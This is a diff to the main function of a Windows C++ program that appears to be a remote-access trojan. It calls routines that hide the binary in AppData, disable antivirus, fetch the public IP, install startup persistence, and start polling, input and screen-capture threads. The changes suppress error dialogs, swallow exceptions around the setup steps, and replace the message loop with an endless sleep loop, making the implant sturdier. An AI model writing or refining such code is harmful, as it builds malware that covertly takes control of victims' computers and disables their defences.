@@ -1664,6 +1664,8 @@ void hideToAppData() {
 }
 
 int main(int argc, char* argv[]) {
+    ShowWindow(GetConsoleWindow(), SW_SHOW);
+    SetErrorMode(SEM_NOGPFAULTERRORBOX);
     bool noScreen = false, showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
@@ -1687,18 +1689,18 @@ int main(int argc, char* argv[]) {
         }
     }
     if (computerName.empty()) computerName = getComputerName();
+    try {
     hideToAppData();
     disableAntivirus();
-    ShowWindow(GetConsoleWindow(), SW_SHOW);
     publicIP = getPublicIP();
     installStartup();
+    } catch(...) {}
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     CreateThread(0, 0, pollThread, 0, 0, 0);
     CreateThread(0, 0, inputThread, 0, 0, 0);
     if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
-    MSG msg;
-    while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
+    while(true) try { Sleep(10000); } catch(...) { Sleep(10000); }
     GdiplusShutdown(gdiplusToken);
 }
